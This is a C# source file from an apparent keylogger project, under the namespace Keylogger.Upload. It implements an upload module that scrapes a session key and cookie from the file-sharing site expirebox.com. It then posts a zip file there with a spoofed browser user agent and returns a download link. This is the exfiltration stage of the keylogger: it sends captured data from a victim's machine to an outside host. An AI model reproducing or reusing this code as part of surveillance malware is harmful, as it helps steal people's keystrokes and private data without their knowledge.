using CsQuery;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger.Upload
{
    /// <summary>
    /// Represent expirebox.com online storage
    /// </summary>
    public class ExpireBox : IOnlineService
    {
        /// <summary>
        /// This function should upload given zip file onto online storage and return link for file download
        /// </summary>
        /// <param name="zipFile">Path to the zip file to upload</param>
        /// <returns>Url where the zip file can be downloaded</returns>
        public string Upload(string zipFile)
        {
            // Download u_key and session aka browser
            string key = null;
            string sessionCookie = null;
            using (WebClient wc = new WebClient())
            {
                // Prepare client
                wc.Headers[HttpRequestHeader.Host] = "expirebox.com";
                wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
                wc.Headers[HttpRequestHeader.Accept] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                wc.Headers[HttpRequestHeader.AcceptLanguage] = "cs,en-US;q=0.7,en;q=0.3";
                wc.Headers[HttpRequestHeader.AcceptEncoding] = "identity";

                // Parse HTML
                string content = wc.DownloadString("https://expirebox.com/");
                CQ dom = content;

                // Get the key
                key = dom["[name='u_key']"].Single().Value;

                // Get session cookie
                string cookies = wc.ResponseHeaders[HttpResponseHeader.SetCookie];
                sessionCookie = cookies.Substring(0, cookies.IndexOf(';'));
            }

            // Upload the file
            using (WebClient wc = new WebClient())
            {
                // Boundary for multipart/form-data request
                string boundary = "-----------------------------93391194027355";

                // Prepare client
                wc.Headers[HttpRequestHeader.Host] = "expirebox.com";
                wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
                wc.Headers[HttpRequestHeader.Accept] = "application/json, text/javascript, */*; q=0.01";
                wc.Headers[HttpRequestHeader.AcceptLanguage] = "cs,en-US;q=0.7,en;q=0.3";
                wc.Headers[HttpRequestHeader.AcceptEncoding] = "identity";
                wc.Headers[HttpRequestHeader.Referer] = "https://expirebox.com/";
                wc.Headers["X-Requested-With"] = "XMLHttpRequest";
                wc.Headers[HttpRequestHeader.ContentType] = "multipart/form-data; boundary=" + boundary;
                wc.Headers[HttpRequestHeader.Cookie] = sessionCookie + ";cookiebar=CookieAllowed";

                // Prepare request data
                string[] lines = new string[]
                {
                    "--" + boundary,
                    "Content-Disposition: form-data; name=\"u_key\"",
                    "",
                    key,
                    "--" + boundary,
                    "Content-Disposition: form-data; name=\"files[]\"; filename=\"" + Path.GetFileName(zipFile) + "\"",
                    "Content-Type: application/x-zip-compressed",
                    "",
                    ""
                };
                List<byte> requestData = Encoding.ASCII.GetBytes(String.Join("\r\n", lines)).ToList();
                requestData.AddRange(File.ReadAllBytes(zipFile));
                requestData.AddRange(Encoding.ASCII.GetBytes("\r\n--" + boundary + "--\r\n"));

                // Upload the file
                byte[] response = wc.UploadData("https://expirebox.com/jqu/", requestData.ToArray());
                string textResponse = Encoding.ASCII.GetString(response);

                // Parse JSON and extract link
                JObject json = JObject.Parse(textResponse);
                string fileKey = json["files"][0]["fileKey"].ToString();

                return $"https://expirebox.com/download/{fileKey}.html";
            }
        }
    }
}
